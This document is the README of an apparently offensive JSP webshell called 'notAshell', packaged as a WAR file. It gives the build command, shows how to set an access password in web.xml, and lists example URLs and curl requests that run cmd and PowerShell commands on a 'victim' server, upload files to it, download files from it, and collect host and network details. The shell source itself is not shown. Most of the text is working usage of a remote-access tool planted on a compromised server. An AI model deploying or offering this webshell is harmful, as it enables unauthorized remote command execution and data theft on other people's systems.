## War structure
```txt
webapp/
├── shell.jsp
└── WEB-INF
    └── web.xml

2 directories, 2 files
```

## How to generate the war file
Just run the following command:
```sh
cd webapp && jar -cvf ../notAshell.war * && cd ..
```

## Setting up the password  
You need to define the password to use when using this webshell. Modify the `param-value` in this line at `webapp/WEB-INF/web.xml`:
```xml
    <context-param>
        <param-name>pass</param-name>
        <param-value>Your-Awesome-Pass</param-value>
    </context-param>
```

## Webshell funcionalities
- `cmd`: Command execution via cmd
- `ps`: Command execution via powershell
- `upload`: Upload files to the server
- `download`: Download files from the server

## Usage
**Note (1): You need to configure the password in the `web.xml` file**
**Note (2): The application name depends on the name you give when creating the `war` file. In this case, we will use the name `notAshell`.**

### Obtain basic information (no `action`)
You can otain Java System properties, global JNDI, hostname and IP configuartion.
- `http://<url>:<port>/notAshell/?pass=Your-Awesome-Pass`

### Execute CMD (`action = cmd`)
Run a command on the victim CMD.
- `http://<url>:<port>/notAshell/?pass=Your-Awesome-Pass&action=cmd&args=dir` 

### Execute PowerShell (`action = ps`)
Run a command on the victim PS.
- `http://<url>:<port>/notAshell/?pass=Your-Awesome-Pass&action=ps&args=ls` 

### Upload a file (`action = upload`)
Upload files to the victim.
- `curl -X POST -F "file=<file_to_upload>" "http://<url>:<port>/notAshell/?pass=Your-Awesome-Pass&action=upload&path=<path_to_upload_at_victim>"`
If the path is not set the file will be placed in the same directory as the webshell.

## Download file or directory (`action = download`)
- `curl "http://<url>:<port>/notAshell/?pass=Your-Awesome-Pass&action=download&path=<file_path>&args=<file_to_download>"`

If the path is not set, it will try to download the file from the same directory as the webshell.

